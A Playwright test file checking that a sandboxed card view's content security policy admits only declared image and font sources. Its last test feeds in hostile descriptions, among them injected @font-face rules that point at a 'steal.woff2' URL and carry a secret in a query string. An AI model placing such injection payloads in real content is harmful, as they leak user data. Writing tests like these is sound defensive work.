import { expect, test } from '@playwright/test';
import { ARTWORK_SIZE, fontDataUrl, imageDataUrl } from './asset-fixtures.js';
import { directive, policyText, probeFont, probeImage, PROBE_WIDTH, settle } from './asset-probes.js';
import { cleanupServedResources, IMAGE, IMAGE_HOST, open, policyOf, type OpenOptions } from './description-harness.js';

// Trusted application artwork and fonts under the approved resource policy, observed in the built
// episode view mounted in the sandboxed iframe of the local host fixture. The host fixture applies
// its own policy from the resource's declared domains and the document carries the policy-derived
// one; a document must satisfy both. Every claim is made from what the browser actually did: an
// image's natural size, a font's measured advance and loaded status, the security-policy violation
// events, and the https requests that reached the network layer. Local checks establish policy and
// browser behavior; real-host runs are separate acceptance evidence.
//
// The built view has no artwork of its own. A trusted template is stood in for by markup the spec
// writes into the served document (static data artwork and font) or into the mounted frame (object
// URLs, which can only be made at run time and exist only inside the document that made them).

test.afterEach(cleanupServedResources);

const FONT_ORIGIN = 'https://fonts.example.com';
const OTHER_ORIGIN = 'https://other.example.net';
/** A data image short enough to sit in a description, which has a finite length bound. */
const SHORT_DATA_IMAGE = 'data:image/png;base64,AAAA';

type Level = 'standard' | 'strict';
const LEVELS: readonly Level[] = ['standard', 'strict'];

interface Lists {
  readonly name: string;
  readonly imageHosts: readonly string[];
  readonly fontOrigins: readonly string[];
}
const LISTS: readonly Lists[] = [
  { name: 'empty origin lists', imageHosts: [], fontOrigins: [] },
  { name: 'one image host and several font origins', imageHosts: [IMAGE_HOST], fontOrigins: [FONT_ORIGIN, `${FONT_ORIGIN}:8443`] },
];

/** Trusted template content written into the served document: a data image and a data font. */
const STATIC_ASSETS =
  `<style>@font-face{font-family:"StaticProbe";src:url(${fontDataUrl('woff2', 'StaticProbe')}) format("woff2")}` +
  '#static-text{position:absolute;left:0;top:0;opacity:0;white-space:pre;font:16px "StaticProbe",monospace}</style>' +
  `<img id="static-artwork" alt="" src="${imageDataUrl()}"><span id="static-text">A</span>`;
const withTrustedAssets = (html: string): string => html.replace('</body>', `${STATIC_ASSETS}</body>`);

async function openWith(page: Parameters<typeof open>[0], level: Level, lists: Lists, extra: Partial<OpenOptions> = {}) {
  return open(page, {
    description: 'Ordinary text.',
    level,
    imageHosts: lists.imageHosts,
    fontOrigins: lists.fontOrigins,
    transformHtml: withTrustedAssets,
    ...extra,
  });
}

for (const level of LEVELS) {
  for (const lists of LISTS) {
    test.describe(`${level} mode with ${lists.name}`, () => {
      test('the built document carries one img-src and one font-src that extend the mode baseline', async ({ page }) => {
        const { frame, resource } = await openWith(page, level, lists);
        const expected = policyOf(lists.imageHosts, { level, fontOrigins: lists.fontOrigins });
        const [documentPolicy] = (await policyText(frame)).filter((value) => value === expected.resource.contentSecurityPolicy);
        expect(documentPolicy).toBeDefined();

        const baseline = level === 'standard' ? 'data: blob:' : 'data:';
        const images = lists.imageHosts.map((host) => `https://${host}`).join(' ');
        const fonts = [...lists.fontOrigins].sort().join(' ');
        expect(directive(documentPolicy as string, 'img-src')).toEqual([`img-src ${baseline} ${images}`.trim()]);
        expect(directive(documentPolicy as string, 'font-src')).toEqual([`font-src ${baseline} ${fonts}`.trim()]);
        expect(resource.html).toContain(expected.resource.contentSecurityPolicy);
        // The host is told every declared origin once, and nothing for the data: and blob: baseline.
        expect(resource.csp.resourceDomains).toEqual(expected.resource.resourceDomains);
        expect(resource.csp.resourceDomains.join(' ')).not.toMatch(/data:|blob:/);
      });

      test('trusted data artwork and a data font in the resource display and load', async ({ page }) => {
        const { frame, requests } = await openWith(page, level, lists);
        const artwork = await frame.evaluate(async () => {
          const image = document.getElementById('static-artwork') as HTMLImageElement;
          await image.decode().catch(() => undefined);
          return { width: image.naturalWidth, height: image.naturalHeight, complete: image.complete };
        });
        expect(artwork).toEqual({ ...ARTWORK_SIZE, complete: true });

        const font = await frame.evaluate(async () => {
          const loaded = await document.fonts.load('16px "StaticProbe"', 'A');
          return {
            faces: loaded.length,
            width: (document.getElementById('static-text') as HTMLElement).getBoundingClientRect().width,
          };
        });
        expect(font).toEqual({ faces: 1, width: PROBE_WIDTH });
        expect(requests).toEqual([]); // embedded bytes create no external dependency
      });

      test('a trusted blob image displays in Standard only; Strict blocks it', async ({ page }) => {
        const { frame, requests } = await openWith(page, level, lists);
        const blob = await probeImage(frame, 'blob');
        const data = await probeImage(frame, 'data');
        expect(data).toEqual({ loaded: true, size: ARTWORK_SIZE.width, violations: [] });
        if (level === 'standard') {
          expect(blob).toEqual({ loaded: true, size: ARTWORK_SIZE.width, violations: [] });
        } else {
          expect(blob.loaded).toBe(false);
          expect(blob.violations).toContain('img-src');
        }
        expect(requests).toEqual([]);
      });

      test.describe('embedded fonts', () => {
        test('a data font loads through the API and through @font-face', async ({ page }) => {
          const { frame } = await openWith(page, level, lists);
          for (const via of ['api', 'css'] as const) {
            expect(await probeFont(frame, 'data', via)).toEqual({ loaded: true, size: PROBE_WIDTH, violations: [], readable: true });
          }
        });

        test('a blob font loads in Standard only; Strict blocks it and keeps readable fallback text', async ({ page }) => {
          const { frame } = await openWith(page, level, lists);
          for (const via of ['api', 'css'] as const) {
            const outcome = await probeFont(frame, 'blob', via);
            if (level === 'standard') {
              expect(outcome).toEqual({ loaded: true, size: PROBE_WIDTH, violations: [], readable: true });
            } else {
              expect(outcome.loaded).toBe(false);
              expect(outcome.violations).toContain('font-src');
              expect(outcome.size).not.toBe(PROBE_WIDTH);
              expect(outcome.readable).toBe(true);
            }
          }
        });
      });
    });
  }
}

for (const level of LEVELS) {
  test.describe(`${level} mode remote fonts from the declared origins`, () => {
    const lists: Lists = { name: 'font origins', imageHosts: [], fontOrigins: [FONT_ORIGIN, `${FONT_ORIGIN}:8443`] };

    test('a font from a declared origin loads with CORS, without Show images consent', async ({ page }) => {
      const { frame, requests } = await openWith(page, level, lists);
      expect(await probeFont(frame, { url: `${FONT_ORIGIN}/ok.woff2` })).toEqual({ loaded: true, size: PROBE_WIDTH, violations: [], readable: true });
      expect(await probeFont(frame, { url: `${FONT_ORIGIN}:8443/ok.woff2?v=3`, })).toEqual({ loaded: true, size: PROBE_WIDTH, violations: [], readable: true });
      expect(requests).toEqual([`${FONT_ORIGIN}/ok.woff2`, `${FONT_ORIGIN}:8443/ok.woff2?v=3`]); // a static version parameter is permitted
    });

    test('an unlisted origin, port or scheme is blocked before any request, and the text stays readable', async ({ page }) => {
      const { frame, requests } = await openWith(page, level, lists);
      for (const url of [`${OTHER_ORIGIN}/ok.woff2`, `${FONT_ORIGIN}:9443/ok.woff2`, 'https://sub.fonts.example.com/ok.woff2', 'http://fonts.example.com/ok.woff2']) {
        const outcome = await probeFont(frame, { url });
        expect(outcome.loaded, url).toBe(false);
        expect(outcome.violations, url).toContain('font-src');
        expect(outcome.size, url).not.toBe(PROBE_WIDTH);
        expect(outcome.readable, url).toBe(true);
      }
      expect(requests).toEqual([]);
    });

    test('a response that denies this origin through CORS fails and falls back, though the policy permits the origin', async ({ page }) => {
      const { frame, requests } = await openWith(page, level, lists);
      const outcome = await probeFont(frame, { url: `${FONT_ORIGIN}/cors-denied.woff2` });
      expect(requests).toEqual([`${FONT_ORIGIN}/cors-denied.woff2`]);
      expect(outcome.loaded).toBe(false);
      expect(outcome.violations).toEqual([]); // the policy allowed it; the browser's font-fetch rules did not
      expect(outcome.size).not.toBe(PROBE_WIDTH);
      expect(outcome.readable).toBe(true);
    });

    test('a redirect to an undeclared origin is blocked and the destination is never requested', async ({ page }) => {
      const { frame, requests } = await openWith(page, level, lists);
      const outcome = await probeFont(frame, { url: `${FONT_ORIGIN}/redirect-font.woff2` });
      expect(requests).toEqual([`${FONT_ORIGIN}/redirect-font.woff2`]);
      expect(outcome.loaded).toBe(false);
      expect(outcome.violations).toContain('font-src');
      expect(outcome.readable).toBe(true);
    });

    test('a declared font origin grants no image, script, stylesheet, media, frame or connection permission', async ({ page }) => {
      const { frame, requests } = await openWith(page, level, lists);
      const outcome = await frame.evaluate(
        (origin) =>
          new Promise<{ violations: string[]; scriptRan: boolean }>((resolve) => {
            const violations: string[] = [];
            document.addEventListener('securitypolicyviolation', (event) => violations.push(event.effectiveDirective));
            const script = document.createElement('script');
            script.src = `${origin}/probe.js`;
            document.head.append(script);
            const sheet = document.createElement('link');
            sheet.rel = 'stylesheet';
            sheet.href = `${origin}/fonts.css`; // a font stylesheet is a stylesheet request, not a font request
            document.head.append(sheet);
            const image = document.createElement('img');
            image.src = `${origin}/probe.png`;
            document.body.append(image);
            const audio = document.createElement('audio');
            audio.preload = 'auto';
            audio.src = `${origin}/probe.mp3`;
            document.body.append(audio);
            audio.load();
            const nested = document.createElement('iframe');
            nested.src = `${origin}/frame.html`;
            document.body.append(nested);
            fetch(`${origin}/data.json`).catch(() => undefined);
            setTimeout(() => resolve({ violations, scriptRan: (window as unknown as { __external?: number }).__external === 1 }), 1000);
          }),
        FONT_ORIGIN,
      );
      expect([...new Set(outcome.violations)].sort()).toEqual(['connect-src', 'frame-src', 'img-src', 'media-src', 'script-src-elem', 'style-src-elem']);
      expect(outcome.scriptRan).toBe(false);
      expect(requests).toEqual([]);
    });

    test('an image host grants no font permission, and a font origin grants no content image', async ({ page }) => {
      const { frame, requests } = await openWith(page, level, { name: 'both', imageHosts: [IMAGE_HOST], fontOrigins: [FONT_ORIGIN] });
      const font = await probeFont(frame, { url: `https://${IMAGE_HOST}/ok.woff2` });
      expect(font.loaded).toBe(false);
      expect(font.violations).toContain('font-src');
      const image = await probeImage(frame, { url: `${FONT_ORIGIN}/ok.png` });
      expect(image.loaded).toBe(false);
      expect(image.violations).toContain('img-src');
      expect(requests).toEqual([]);
      // Each origin still serves its own type.
      expect((await probeImage(frame, { url: IMAGE })).loaded).toBe(true);
      expect((await probeFont(frame, { url: `${FONT_ORIGIN}/ok.woff2` })).loaded).toBe(true);
      expect(requests).toEqual([IMAGE, `${FONT_ORIGIN}/ok.woff2`]);
    });
  });
}

// An answer is untrusted. It reaches the card only through the description binding: the MCP tool
// result, the A2UI data model and the restricted Markdown reader. The resource now permits data:
// (and, in Standard, blob:) images and fonts, so what keeps an answer out of the trusted template
// and CSS slots is the shared content decision. This drives hostile descriptions through the real
// binding in both modes, with every consent the reader can give.
for (const level of LEVELS) {
  test(`${level}: supplied content cannot reach template or CSS asset slots, directly or by data/blob conversion`, async ({ page }) => {
    const hostile = [
      `![data](${SHORT_DATA_IMAGE}) ![blob](blob:null/00000000-0000-4000-8000-000000000000) ![remote](${IMAGE})`,
      '',
      `<img src="${SHORT_DATA_IMAGE}"> <style>@font-face{font-family:Evil;src:url(${FONT_ORIGIN}/steal.woff2)}</style>`,
      '',
      `[data link](data:font/woff2;base64,AAAA) [blob link](blob:null/00000000-0000-4000-8000-000000000001) [font](${FONT_ORIGIN}/steal.woff2)`,
      '',
      `@font-face{font-family:Evil2;src:url(${FONT_ORIGIN}/?q=ANSWER-SECRET)}`,
    ].join('\n');
    const { view, frame, requests, openLinkCalls } = await open(page, {
      description: hostile,
      level,
      imageHosts: [IMAGE_HOST],
      fontOrigins: [FONT_ORIGIN],
      hostLinks: 'allow',
    });
    const content = view.getByTestId('card-content');
    await expect(content).toContainText('@font-face{font-family:Evil;'); // visible as text, never applied
    const show = view.getByRole('button', { name: 'Show images' });
    if ((await show.count()) > 0) await show.click(); // Strict: the reader's consent, given
    await settle(frame);

    // Only the one permitted HTTPS image can render; no data or blob image, link or style reaches the DOM.
    const sources = await content.locator('img').evaluateAll((images) => images.map((image) => (image as HTMLImageElement).src));
    expect(sources.every((source) => source === IMAGE)).toBe(true);
    await expect(content.locator('style, link, a, svg, object, embed, iframe')).toHaveCount(0);
    expect(
      await frame.evaluate(() => ({
        faces: document.fonts.size,
        fontFaceRules: Array.from(document.styleSheets).flatMap((sheet) => Array.from(sheet.cssRules)).filter((rule) => rule instanceof CSSFontFaceRule).length,
        dataOrBlobImages: Array.from(document.querySelectorAll('img')).filter((image) => /^(data|blob):/.test(image.src)).length,
      })),
    ).toEqual({ faces: 0, fontFaceRules: 0, dataOrBlobImages: 0 });

    // Nothing asked the font origin for anything, and no link was activated.
    expect(requests.filter((url) => url.startsWith(FONT_ORIGIN))).toEqual([]);
    expect(requests.some((url) => url.includes('ANSWER-SECRET'))).toBe(false);
    expect(openLinkCalls).toEqual([]);
  });
}
